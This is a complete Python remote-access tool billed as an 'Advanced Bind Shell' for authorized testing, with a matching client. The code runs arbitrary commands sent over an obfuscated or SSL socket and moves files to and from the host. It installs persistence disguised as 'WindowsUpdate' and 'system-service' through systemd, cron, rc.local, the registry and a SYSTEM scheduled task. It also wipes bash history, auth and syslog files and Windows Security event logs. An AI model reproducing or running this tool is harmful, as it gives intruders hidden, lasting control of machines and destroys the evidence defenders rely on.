#!/usr/bin/env python3
"""
Advanced Bind Shell with Encryption and Stealth Features
For authorized security testing and educational purposes only
"""
import sys
import os
import socket
import ssl
import subprocess
import threading
import time
import base64
import hashlib
import struct
import platform
import json
from datetime import datetime

class BindShell:
    def __init__(self, lport, password=None, encrypt=True, stealth=False):
        self.lport = int(lport)
        self.password = password
        self.encrypt = encrypt
        self.stealth = stealth
        self.running = True
        self.key = hashlib.sha256(b"bind_shell_secret_2024").digest()
        self.allowed_ips = []
        self.connection_log = []
        
    def xor_crypt(self, data):
        """XOR encryption"""
        if not self.encrypt:
            if isinstance(data, bytes):
                return data
            return data.encode()
        
        if isinstance(data, str):
            data = data.encode()
        
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ self.key[i % len(self.key)])
        return bytes(result)
    
    def authenticate(self, client):
        """Authenticate client connection"""
        if not self.password:
            return True
        
        try:
            # Send authentication prompt
            client.send(self.xor_crypt("[AUTH] Password: "))
            
            # Receive password
            password = self.xor_crypt(client.recv(1024)).decode().strip()
            
            # Verify password
            if password == self.password:
                client.send(self.xor_crypt("[+] Authentication successful\n"))
                return True
            else:
                client.send(self.xor_crypt("[-] Authentication failed\n"))
                time.sleep(1)
                return False
                
        except:
            return False
    
    def execute_command(self, command, client=None):
        """Execute command with enhanced features"""
        try:
            # Built-in commands
            if command.lower() == 'help':
                return self.show_help()
            
            elif command.lower() == 'sysinfo':
                return self.get_system_info()
            
            elif command.lower() == 'netstat':
                return self.get_network_connections()
            
            elif command.lower() == 'ps':
                return self.get_process_list()
            
            elif command.lower() == 'persist':
                return self.install_persistence()
            
            elif command.lower() == 'clean':
                return self.clean_logs()
            
            elif command.lower().startswith('download '):
                return self.handle_download(command[9:].strip(), client)
            
            elif command.lower().startswith('upload '):
                return self.handle_upload(command[7:].strip(), client)
            
            elif command.lower() == 'shell':
                return self.spawn_interactive_shell(client)
            
            else:
                # Execute system command
                if platform.system() == 'Windows':
                    proc = subprocess.Popen(
                        ['cmd.exe', '/c', command],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        creationflags=subprocess.CREATE_NO_WINDOW if self.stealth else 0
                    )
                else:
                    proc = subprocess.Popen(
                        ['/bin/bash', '-c', command],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                        preexec_fn=os.setpgrp if self.stealth else None
                    )
                
                stdout, stderr = proc.communicate(timeout=60)
                
                output = stdout.decode('utf-8', errors='ignore')
                if stderr:
                    output += stderr.decode('utf-8', errors='ignore')
                
                return output if output else "Command executed.\n"
                
        except subprocess.TimeoutExpired:
            proc.kill()
            return "Command timed out.\n"
        except Exception as e:
            return f"Error: {str(e)}\n"
    
    def show_help(self):
        """Show available commands"""
        return """
Available Commands:
  help              - Show this help
  sysinfo           - Display system information
  netstat           - Show network connections
  ps                - List running processes
  persist           - Install persistence
  clean             - Clean logs and traces
  download <file>   - Download file from target
  upload <file>     - Upload file to target
  shell             - Spawn interactive shell
  exit              - Close connection

Any other command will be executed as system command.
"""
    
    def get_system_info(self):
        """Get comprehensive system information"""
        info = {
            'hostname': socket.gethostname(),
            'os': platform.system(),
            'os_version': platform.version(),
            'architecture': platform.machine(),
            'processor': platform.processor(),
            'python_version': sys.version,
            'current_user': os.getenv('USER', os.getenv('USERNAME', 'Unknown')),
            'current_dir': os.getcwd(),
            'pid': os.getpid()
        }
        
        # Get IP addresses
        try:
            info['hostname'] = socket.gethostname()
            info['ip_address'] = socket.gethostbyname(info['hostname'])
        except:
            info['ip_address'] = 'Unknown'
        
        # Get disk usage
        try:
            import shutil
            total, used, free = shutil.disk_usage('/')
            info['disk_total'] = f"{total // (1024**3)} GB"
            info['disk_free'] = f"{free // (1024**3)} GB"
        except:
            pass
        
        # Get memory info
        try:
            import psutil
            mem = psutil.virtual_memory()
            info['memory_total'] = f"{mem.total // (1024**3)} GB"
            info['memory_available'] = f"{mem.available // (1024**3)} GB"
        except:
            pass
        
        return json.dumps(info, indent=2) + "\n"
    
    def get_network_connections(self):
        """Get network connections"""
        try:
            if platform.system() == 'Windows':
                return self.execute_command('netstat -ano')
            else:
                return self.execute_command('netstat -tulnp')
        except:
            return "Unable to get network connections.\n"
    
    def get_process_list(self):
        """Get process list"""
        try:
            if platform.system() == 'Windows':
                return self.execute_command('tasklist')
            else:
                return self.execute_command('ps aux')
        except:
            return "Unable to get process list.\n"
    
    def install_persistence(self):
        """Install persistence mechanisms"""
        methods = []
        
        try:
            system = platform.system()
            
            if system == 'Linux':
                # Systemd service
                service_content = f"""[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {os.path.abspath(__file__)} --listen {self.lport}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
                try:
                    with open('/etc/systemd/system/system-service.service', 'w') as f:
                        f.write(service_content)
                    os.system('systemctl enable system-service.service 2>/dev/null')
                    methods.append("Systemd service created")
                except:
                    pass
                
                # Cron job
                cron_line = f"@reboot {sys.executable} {os.path.abspath(__file__)} --listen {self.lport} &\n"
                try:
                    os.system(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -')
                    methods.append("Cron job added")
                except:
                    pass
                
                # RC.local
                try:
                    with open('/etc/rc.local', 'a') as f:
                        f.write(f"{sys.executable} {os.path.abspath(__file__)} --listen {self.lport} &\n")
                    os.chmod('/etc/rc.local', 0o755)
                    methods.append("RC.local entry added")
                except:
                    pass
            
            elif system == 'Windows':
                import winreg
                
                # Registry Run key
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                try:
                    with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                        winreg.SetValueEx(regkey, "WindowsService", 0, winreg.REG_SZ,
                                        f'{sys.executable} {os.path.abspath(__file__)} --listen {self.lport}')
                    methods.append("Registry Run key added")
                except:
                    pass
                
                # Scheduled task
                try:
                    os.system(f'schtasks /create /tn "WindowsUpdate" /tr "{sys.executable} {os.path.abspath(__file__)} --listen {self.lport}" /sc onstart /ru SYSTEM /f')
                    methods.append("Scheduled task created")
                except:
                    pass
        
        except Exception as e:
            return f"Persistence installation failed: {str(e)}\n"
        
        return "Persistence methods:\n" + "\n".join(f"  [+] {m}" for m in methods) + "\n"
    
    def clean_logs(self):
        """Clean system logs and traces"""
        cleaned = []
        
        try:
            system = platform.system()
            
            if system == 'Linux':
                # Clear bash history
                try:
                    os.system('history -c')
                    os.system('rm -f ~/.bash_history')
                    cleaned.append("Bash history cleared")
                except:
                    pass
                
                # Clear system logs (requires root)
                logs = ['/var/log/auth.log', '/var/log/syslog', '/var/log/messages']
                for log in logs:
                    try:
                        if os.path.exists(log):
                            os.system(f'echo "" > {log} 2>/dev/null')
                            cleaned.append(f"Cleared {log}")
                    except:
                        pass
            
            elif system == 'Windows':
                # Clear event logs
                logs = ['Application', 'Security', 'System']
                for log in logs:
                    try:
                        os.system(f'wevtutil cl {log} 2>nul')
                        cleaned.append(f"Cleared {log} event log")
                    except:
                        pass
        
        except Exception as e:
            return f"Log cleaning failed: {str(e)}\n"
        
        return "Logs cleaned:\n" + "\n".join(f"  [+] {c}" for c in cleaned) + "\n"
    
    def handle_download(self, filepath, client):
        """Handle file download from target"""
        try:
            if not os.path.exists(filepath):
                return f"[-] File not found: {filepath}\n"
            
            file_size = os.path.getsize(filepath)
            
            # Send file header
            header = f"[FILE] {os.path.basename(filepath)} [{file_size} bytes]"
            client.send(self.xor_crypt(header + "\n"))
            
            # Wait for acknowledgment
            ack = self.xor_crypt(client.recv(1024)).decode().strip()
            if ack != 'READY':
                return "[-] Transfer aborted\n"
            
            # Send file content
            with open(filepath, 'rb') as f:
                while True:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    
                    # Encode and send
                    encoded = base64.b64encode(chunk).decode()
                    client.send(self.xor_crypt(encoded + "\n"))
                    time.sleep(0.01)
            
            # Send end marker
            client.send(self.xor_crypt("[EOF]\n"))
            
            return f"[+] File sent: {filepath} ({file_size} bytes)\n"
            
        except Exception as e:
            return f"[-] Download failed: {str(e)}\n"
    
    def handle_upload(self, filename, client):
        """Handle file upload to target"""
        try:
            # Request file content
            client.send(self.xor_crypt("[READY]\n"))
            
            # Receive file content
            file_data = b""
            while True:
                chunk = self.xor_crypt(client.recv(4096)).decode().strip()
                if chunk == '[EOF]':
                    break
                file_data += base64.b64decode(chunk)
            
            # Save file
            with open(filename, 'wb') as f:
                f.write(file_data)
            
            return f"[+] File saved: {filename} ({len(file_data)} bytes)\n"
            
        except Exception as e:
            return f"[-] Upload failed: {str(e)}\n"
    
    def spawn_interactive_shell(self, client):
        """Spawn interactive shell"""
        try:
            if platform.system() == 'Windows':
                proc = subprocess.Popen(
                    'cmd.exe',
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
            else:
                proc = subprocess.Popen(
                    '/bin/bash',
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
            
            client.send(self.xor_crypt("[+] Interactive shell spawned\n"))
            
            while True:
                # Receive command
                cmd = self.xor_crypt(client.recv(4096)).decode().strip()
                
                if cmd.lower() == 'exit':
                    proc.terminate()
                    break
                
                # Execute and send output
                proc.stdin.write((cmd + '\n').encode())
                proc.stdin.flush()
                
                output = proc.stdout.readline().decode('utf-8', errors='ignore')
                client.send(self.xor_crypt(output))
            
            return "Interactive shell closed.\n"
            
        except Exception as e:
            return f"Interactive shell failed: {str(e)}\n"
    
    def handle_client(self, client, addr):
        """Handle individual client connection"""
        self.connection_log.append({
            'ip': addr[0],
            'port': addr[1],
            'time': datetime.now().isoformat()
        })
        
        print(f"\n[+] Connection from {addr[0]}:{addr[1]}")
        
        # Check allowed IPs
        if self.allowed_ips and addr[0] not in self.allowed_ips:
            client.send(self.xor_crypt("[-] Access denied\n"))
            client.close()
            return
        
        # Authenticate
        if not self.authenticate(client):
            client.close()
            return
        
        # Send welcome message
        welcome = f"""
╔══════════════════════════════════════════╗
║        Advanced Bind Shell v2.0          ║
║        Type 'help' for commands          ║
╚══════════════════════════════════════════╝
"""
        client.send(self.xor_crypt(welcome))
        
        # Command loop
        while self.running:
            try:
                # Send prompt
                prompt = f"\n[{os.getcwd()}]> "
                client.send(self.xor_crypt(prompt))
                
                # Receive command
                data = client.recv(8192)
                if not data:
                    break
                
                command = self.xor_crypt(data).decode('utf-8', errors='ignore').strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit':
                    client.send(self.xor_crypt("[*] Closing connection...\n"))
                    break
                
                # Execute command
                output = self.execute_command(command, client)
                
                # Send output
                if output:
                    client.send(self.xor_crypt(output))
                
            except Exception as e:
                break
        
        client.close()
        print(f"[-] Connection closed: {addr[0]}:{addr[1]}")
    
    def start_ssl_server(self):
        """Start SSL-enabled bind shell"""
        # Generate self-signed certificate
        cert_file = '/tmp/bind_shell.crt'
        key_file = '/tmp/bind_shell.key'
        
        try:
            from cryptography import x509
            from cryptography.x509.oid import NameOID
            from cryptography.hazmat.primitives import hashes
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.hazmat.backends import default_backend
            import datetime
            
            # Generate key
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=2048,
                backend=default_backend()
            )
            
            # Generate certificate
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Security Test"),
                x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
            ])
            
            cert = x509.CertificateBuilder().subject_name(
                subject
            ).issuer_name(
                issuer
            ).public_key(
                private_key.public_key()
            ).serial_number(
                x509.random_serial_number()
            ).not_valid_before(
                datetime.datetime.utcnow()
            ).not_valid_after(
                datetime.datetime.utcnow() + datetime.timedelta(days=365)
            ).sign(private_key, hashes.SHA256(), default_backend())
            
            # Save certificate and key
            from cryptography.hazmat.primitives import serialization
            
            with open(cert_file, 'wb') as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))
            
            with open(key_file, 'wb') as f:
                f.write(private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.TraditionalOpenSSL,
                    encryption_algorithm=serialization.NoEncryption()
                ))
            
        except ImportError:
            # Fallback to using openssl command
            os.system(f'openssl req -x509 -newkey rsa:4096 -keyout {key_file} -out {cert_file} -days 365 -nodes -subj "/CN=localhost" 2>/dev/null')
        
        # Create SSL context
        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.load_cert_chain(cert_file, key_file)
        
        # Start server
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.lport))
        server.listen(5)
        
        print(f"[*] SSL Bind Shell listening on port {self.lport}")
        
        return server, context
    
    def start_plain_server(self):
        """Start plain TCP bind shell"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.lport))
        server.listen(5)
        
        print(f"[*] Bind Shell listening on port {self.lport}")
        
        return server, None
    
    def start(self, use_ssl=False):
        """Start the bind shell"""
        try:
            if use_ssl:
                server, ssl_context = self.start_ssl_server()
            else:
                server, ssl_context = self.start_plain_server()
            
            print(f"[*] Encryption: {'Enabled' if self.encrypt else 'Disabled'}")
            print(f"[*] Authentication: {'Required' if self.password else 'None'}")
            print(f"[*] Stealth mode: {'Enabled' if self.stealth else 'Disabled'}")
            
            if self.allowed_ips:
                print(f"[*] IP whitelist: {', '.join(self.allowed_ips)}")
            
            print("\n[*] Waiting for connections...\n")
            
            while self.running:
                try:
                    client, addr = server.accept()
                    
                    if ssl_context:
                        client = ssl_context.wrap_socket(client, server_side=True)
                    
                    # Handle connection in thread
                    handler = threading.Thread(
                        target=self.handle_client,
                        args=(client, addr),
                        daemon=True
                    )
                    handler.start()
                    
                except KeyboardInterrupt:
                    break
                except Exception as e:
                    if self.running:
                        print(f"[-] Error: {e}")
            
            server.close()
            
        except PermissionError:
            print(f"[-] Permission denied. Port {self.lport} requires root/admin privileges.")
            sys.exit(1)
        except Exception as e:
            print(f"[-] Failed to start bind shell: {e}")
            sys.exit(1)

class BindShellClient:
    """Client for connecting to bind shell"""
    
    def __init__(self, host, port, password=None, encrypt=True, use_ssl=False):
        self.host = host
        self.port = int(port)
        self.password = password
        self.encrypt = encrypt
        self.use_ssl = use_ssl
        self.key = hashlib.sha256(b"bind_shell_secret_2024").digest()
    
    def xor_crypt(self, data):
        """XOR encryption/decryption"""
        if not self.encrypt:
            if isinstance(data, bytes):
                return data
            return data.encode()
        
        if isinstance(data, str):
            data = data.encode()
        
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ self.key[i % len(self.key)])
        return bytes(result)
    
    def connect(self):
        """Connect to bind shell"""
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            sock.connect((self.host, self.port))
            print(f"[+] Connected to {self.host}:{self.port}")
            
            # Handle authentication
            data = self.xor_crypt(sock.recv(4096)).decode()
            if '[AUTH]' in data:
                if self.password:
                    sock.send(self.xor_crypt(self.password))
                    response = self.xor_crypt(sock.recv(4096)).decode()
                    if 'failed' in response:
                        print("[-] Authentication failed")
                        sock.close()
                        return
                    print(response.strip())
                else:
                    print("[-] Password required")
                    sock.close()
                    return
            
            # Interactive shell
            while True:
                try:
                    # Receive prompt
                    data = self.xor_crypt(sock.recv(4096)).decode()
                    if not data:
                        break
                    
                    # Display output and get command
                    cmd = input(data)
                    
                    if not cmd:
                        continue
                    
                    # Send command
                    sock.send(self.xor_crypt(cmd))
                    
                    if cmd.lower() == 'exit':
                        break
                    
                    # Receive response
                    time.sleep(0.1)
                    response = self.xor_crypt(sock.recv(8192)).decode()
                    if response:
                        print(response, end='')
                    
                except KeyboardInterrupt:
                    print("\n[*] Use 'exit' to close connection")
                    continue
                except Exception as e:
                    print(f"\n[-] Error: {e}")
                    break
            
            sock.close()
            print("\n[*] Connection closed")
            
        except ConnectionRefusedError:
            print(f"[-] Connection refused: {self.host}:{self.port}")
        except Exception as e:
            print(f"[-] Connection failed: {e}")

def main():
    if len(sys.argv) < 2:
        print("""
╔══════════════════════════════════════════════════════════════╗
║              Advanced Bind Shell v2.0                        ║
╠══════════════════════════════════════════════════════════════╣
║ Usage:                                                       ║
║   python bind_shell.py <mode> [options]                      ║
║                                                              ║
║ Modes:                                                       ║
║   listen    - Start bind shell listener                      ║
║   connect   - Connect to bind shell                          ║
║                                                              ║
║ Options:                                                     ║
║   --port <port>      - Port to bind/connect (required)       ║
║   --host <ip>        - Target IP (for connect mode)          ║
║   --password <pass>  - Authentication password               ║
║   --ssl              - Enable SSL/TLS                        ║
║   --no-encrypt       - Disable encryption                    ║
║   --stealth          - Enable stealth mode                   ║
║   --whitelist <ips>  - IP whitelist (comma-separated)        ║
║                                                              ║
║ Examples:                                                    ║
║   Listener:                                                  ║
║     python bind_shell.py listen --port 4444 --password secret║
║                                                              ║
║   Connect:                                                   ║
║     python bind_shell.py connect --host 10.0.0.5 --port 4444║
║              --password secret                               ║
╚══════════════════════════════════════════════════════════════╝
        """)
        sys.exit(1)
    
    mode = sys.argv[1]
    
    # Parse arguments
    args = {}
    i = 2
    while i < len(sys.argv):
        if sys.argv[i] == '--port' and i + 1 < len(sys.argv):
            args['port'] = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--host' and i + 1 < len(sys.argv):
            args['host'] = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--password' and i + 1 < len(sys.argv):
            args['password'] = sys.argv[i + 1]
            i += 2
        elif sys.argv[i] == '--ssl':
            args['ssl'] = True
            i += 1
        elif sys.argv[i] == '--no-encrypt':
            args['no_encrypt'] = True
            i += 1
        elif sys.argv[i] == '--stealth':
            args['stealth'] = True
            i += 1
        elif sys.argv[i] == '--whitelist' and i + 1 < len(sys.argv):
            args['whitelist'] = sys.argv[i + 1].split(',')
            i += 2
        else:
            i += 1
    
    if mode == 'listen':
        if 'port' not in args:
            print("[-] --port required for listener")
            sys.exit(1)
        
        print("[!] WARNING: Only use for authorized security testing!")
        
        shell = BindShell(
            args['port'],
            args.get('password'),
            not args.get('no_encrypt', False),
            args.get('stealth', False)
        )
        
        if args.get('whitelist'):
            shell.allowed_ips = args['whitelist']
        
        shell.start(use_ssl=args.get('ssl', False))
    
    elif mode == 'connect':
        if 'host' not in args or 'port' not in args:
            print("[-] --host and --port required for client")
            sys.exit(1)
        
        print("[!] WARNING: Only use for authorized security testing!")
        
        client = BindShellClient(
            args['host'],
            args['port'],
            args.get('password'),
            not args.get('no_encrypt', False),
            args.get('ssl', False)
        )
        client.connect()

if __name__ == "__main__":
    main()
